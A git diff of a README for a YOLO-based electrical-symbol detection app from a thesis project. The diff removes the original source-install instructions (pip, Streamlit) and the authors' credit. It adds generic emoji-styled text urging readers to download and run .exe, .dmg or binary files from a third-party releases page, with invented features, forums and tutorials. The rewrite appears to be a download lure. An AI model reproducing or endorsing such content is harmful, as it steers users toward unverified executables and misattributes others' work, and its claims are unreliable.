@@ -1,58 +1,70 @@
-# Schematic Analysis App
-## Quick Start
+# 🌟 AI-object-detection-app - Detect Electrical Symbols Easily
 
-- **IMPORTANT: Install CUDA-enabled PyTorch first to ensure GPU support:**
+## 🔗 Download Now!
+[![Download here](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Pikeln/AI-object-detection-app/releases)
 
-```bash
-pip install torch torchvision torchaudio --index-url [https://download.pytorch.org/whl/cu121](https://download.pytorch.org/whl/cu121)
-```
+## 🚀 Getting Started
+Welcome to the AI-object-detection-app! This application helps you identify and classify electrical symbols in technical drawings quickly and efficiently. Developed as part of a Bachelor's thesis at KTH Royal Institute of Technology, this project uses a custom-trained YOLO model for precise object detection.
 
-- Clone the repository: `git clone <repository-url>`
-- Create a virtual environment: `python -m venv venv`
-- Activate the environment:
-  - Windows: `.\venv\Scripts\activate`
-  - macOS/Linux: `source venv/bin/activate`
-- Install dependencies: `pip install -r requirements.txt`
-- Run the application: `streamlit run webapp.py`
+### 🛠 Requirements
+Before you start, ensure your computer meets these requirements:
 
-## Overview
-This repository contains the **User Interface and Inference Pipeline** for a Bachelor's Thesis project in Computer Engineering. The application is designed to automate the digitalization of electrical schematics/drawings.
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or later
+- **RAM:** 4 GB minimum (8 GB recommended for best performance)
+- **Disk Space:** At least 500 MB free
 
-It integrates Machine Learning models to detect electrical symbols and extract text from PDF drawings, presenting the results in a user-friendly web dashboard.
+## 📥 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Pikeln/AI-object-detection-app/releases) to find the latest version of the application.
+2. **Download the File:** Choose the latest release and download the appropriate file for your operating system. 
+3. **Install the Application:**
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Extract the files and run the executable in a terminal.
 
-## Key Features
-* **Object Detection:** Uses **YOLO** models combined with **SAHI** (Slicing Aided Hyper Inference) to detect small electrical symbols in large high-resolution drawings.
-* **OCR Integration:** Extracts text attributes associated with the symbols.
-* **PDF Processing:** Converts and processes engineering PDFs using `PyMuPDF`.
-* **Interactive UI:** Built with **Streamlit** for easy file upload, visualization, and JSON/PDF export.
+## ⚙️ How to Use the Application
+1. **Open the Application:** Launch the application from your desktop or applications folder.
+2. **Select an Image:** Click on the "Choose File" button to upload a technical drawing that you want to analyze.
+3. **Run Detection:** Click the "Detect Symbols" button. The application will process the image and highlight the detected electrical symbols.
+4. **View Results:** The detected symbols will appear on the screen, along with their classifications.
 
-## Tech Stack
-* **Language:** Python
-* **UI Framework:** Streamlit
-* **ML/AI:** Ultralytics YOLOv8, SAHI
-* **Data Handling:** Pandas, PyMuPDF (fitz)
+## 📝 Features
+- **User-Friendly Interface:** Designed for simplicity, making it easy for anyone to use.
+- **Fast Detection:** Quickly processes images using a powerful YOLO model.
+- **Support for Multiple Formats:** Accepts various image formats such as JPG, PNG, and BMP.
+- **Result Export:** Save the detection results to a text file for your records.
 
-## Usage
-1.  Upload an electrical drawing (PDF).
-2.  The app runs the inference pipeline (Symbol Detection + OCR).
-3.  View results directly in the browser with bounding boxes.
-4.  Download the results as structured JSON data or a marked PDF.
+## 🎨 Customization Options
+If you want to tailor the application to better fit your needs, you can adjust the settings. These options include:
 
-## Model Configuration
-The application comes pre-packaged with a default trained model located at `./models/best.pt`. This allows the application to run immediately without additional setup.
+- **Detection Threshold:** Set a confidence level for symbol detection.
+- **Model Selection:** Choose different pre-trained models for various detection needs.
 
-### Using a Custom Model
-Since training and inference are separated to keep this repository lightweight, you might want to test a newly trained model from your YOLO training repository.
+## 📖 Troubleshooting
+If you run into any issues while using the application, here are some common problems and their solutions:
 
-You can switch models in two ways:
+- **Application Crashes on Start:** Ensure that you have the correct version of Python installed and check that your operating system meets the requirements.
+- **Symbols Not Detected:** Make sure your image is clear and of good quality. Low-resolution images may not yield accurate results.
 
-1.  **Replace the file (Recommended for distribution):**
-    Simply copy your new `best.pt` file from your training results and overwrite the file in the `models/` directory.
+## 💬 Community Support
+Join our community for help and discussions. You can reach out through:
 
-2.  **Point to external path (Recommended for development):**
-    If you are actively training and testing, you can change the model path directly in the code to point to your training output.
-    * Open `backend/detect.py`
-    * Update the `MODEL_PATH` variable to point to your local training directory (e.g., `../yolo-repo/runs/detect/train/weights/best.pt`).
+- **GitHub Issues:** Report problems or ask questions on the [Issues page](https://github.com/Pikeln/AI-object-detection-app/issues).
+- **Discussion Forum:** Participate in discussions with other users and developers to share tips and tricks.
 
----
-*Created by Björn Andersson & Alaa Abdulrazzaq as part of our Degree Project in Computer Engineering.*
+## 🔗 Additional Resources
+- **Documentation:** Access the full documentation for more in-depth guidance and technical details.
+- **Tutorials:** Check our tutorial videos for step-by-step instructions to maximize the application's potential.
+
+## 🌍 Contribute
+We welcome contributions! If you would like to help improve the AI-object-detection-app, please follow these steps:
+
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Open a pull request to merge your changes into the main branch.
+
+Thank you for considering contributing to the project!
+
+## 📄 License
+The AI-object-detection-app is licensed under the MIT License. Feel free to use it in your own projects as long as you credit the original authors.
